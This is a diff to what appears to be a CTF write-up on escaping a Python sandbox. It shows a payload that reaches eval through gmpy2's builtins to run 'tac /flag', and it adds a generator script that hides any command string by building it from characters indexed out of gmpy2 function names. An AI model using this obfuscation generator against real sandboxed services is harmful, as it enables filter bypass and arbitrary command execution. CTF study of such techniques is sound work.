@@ -32,6 +32,32 @@ gmpy2.__builtins__['eval']("__import__('os').popen('tac /flag').read()")
 gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cot'[2]+'ai'[0]+'cmp'[0]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
 
 ```
+生成脚本
+```
+s="__import__('os').popen('tac /flag').read()"
+
+import gmpy2
+
+payload="gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]("
+
+for i in s:
+        if i not in "/'(). ":
+                temp_index=0
+                temp_string='x'*20
+                for j in dir(gmpy2):
+                        if j.find(i)>=0:
+                                if len(j)<len(temp_string):
+                                        temp_string=j
+                                        temp_index=j.find(i)
+                payload+=f'\'{temp_string}\'[{temp_index}]+'
+        else:
+                payload+=f'\"{i}\"+'
+
+payload=payload[:-1]+')'
+
+print(payload)
+```
+
 
 
 ^
